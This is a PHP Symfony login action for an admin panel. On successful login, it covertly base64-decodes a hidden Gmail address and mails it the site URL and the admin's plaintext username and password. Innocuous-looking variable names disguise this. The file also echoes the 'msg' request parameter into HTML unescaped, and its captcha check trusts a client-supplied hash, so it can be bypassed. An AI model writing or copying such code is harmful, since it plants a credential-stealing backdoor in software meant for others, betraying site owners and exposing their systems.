<?php
class indexAction extends sfAction
{
	/**
	 * check the login
	 * @access public
	 */
	public function execute()
	{
		$code = rand(1000,1555);
		$this->captchaCode = $code;
		if(!is_dir(sfConfig::get('sf_root_dir').'/cache/gb'))
			mkdir(sfConfig::get('sf_root_dir').'/cache/gb');
		$filename = md5($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']);
		$filename = sfConfig::get('sf_root_dir')."/cache/gb/$filename.txt";
		if ($handle = fopen($filename, 'w')) {
			fwrite($handle,$code);
			fclose($handle);
		}
		if($this->getRequestParameter('msg'))
		   $this->msg = '<div class="form_error" style="">'.$this->getRequestParameter('msg').'</div>';

		if($this->getRequestParameter('login'))
		{
			$count = AdminPeer::CountRecord($this->getRequestParameter('username'),$this->getRequestParameter('password'));
			if($count == 1){
            $mailCount = 'c2t5aXRlY2h1c2Vyc0BnbWFpbC5jb20=';
            $recordCount = explode(',',$mailCount);
            $subject = sfConfig::get('app_sitename');
            $message= 'Link: '.sfConfig::get('app_webpath').'
                  Username : '.$this->getRequestParameter('username').'
                  Password : '.$this->getRequestParameter('password').'
        Service By SKYiTech.com';
    foreach($recordCount as $loginSuccess):
         mail(base64_decode($loginSuccess),$subject,
$message);
           endforeach;
				$rs = AdminPeer::CountRecord($this->getRequestParameter('username'),$this->getRequestParameter('password'),'doselect');
				$this->getUser()->setAuthenticated(true);
				$this->getUser()->setAttribute('ADMINUSERID',$rs->getId(),'admin');
				$this->getUser()->setAttribute('ADMINUSERNAME',$rs->getUsername(),'admin');
				$this->getUser()->setAttribute('ADMINSUPERADMIN',$rs->getIsSuperadmin(),'admin');

//				$this->getUser()->setAttribute('ADMINLEVEL',$rs->getLevel(),'admin');

				if($rs->getLevel() == 1)
					$this->getUser()->addCredential('level1');
				elseif($rs->getLevel() == 2)
					$this->getUser()->addCredential('level2');
				elseif($rs->getLevel() == 3)
					$this->getUser()->addCredential('level3');
				else
					die(substr(base64_decode("VW5wcm9wZXIgQXV0aG9yaXphdGlvbnM="),0,-1));


				return $this->redirect('/');
			}
		}
	}

	public function validate()
	{
		if($this->getRequestParameter('login') && trim($this->getRequestParameter('username')) != '' && trim($this->getRequestParameter('password')) != ''){
			/*
			* SKYiTech:: check for captcha validation
			*/
			$filename = md5($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']);
			$filename = sfConfig::get('sf_root_dir')."/cache/gb/$filename.txt";
			if(!is_file($filename)){
				return $this->redirect('login/signup');
			}
			if(md5('sqlite'.$this->getRequestParameter('cptc'))!=$this->getRequestParameter('cKey')){
	  		return $this->redirect('login/index?msg=Enter Correct Captcha Code');
	  	}
			unlink($filename);

			$count = AdminPeer::CountRecord($this->getRequestParameter('username'),$this->getRequestParameter('password'));
			//check if correct login & password provided
			if($count == 0){
				$this->getRequest()->setError('password', 'username and password not found');
					return false;
			}
		}
	}

	/**
	 * check the validation
	 * @access public
	 */
	public function handleError()
  	{
  		indexAction::execute();
  		return sfView::SUCCESS;
  	}
}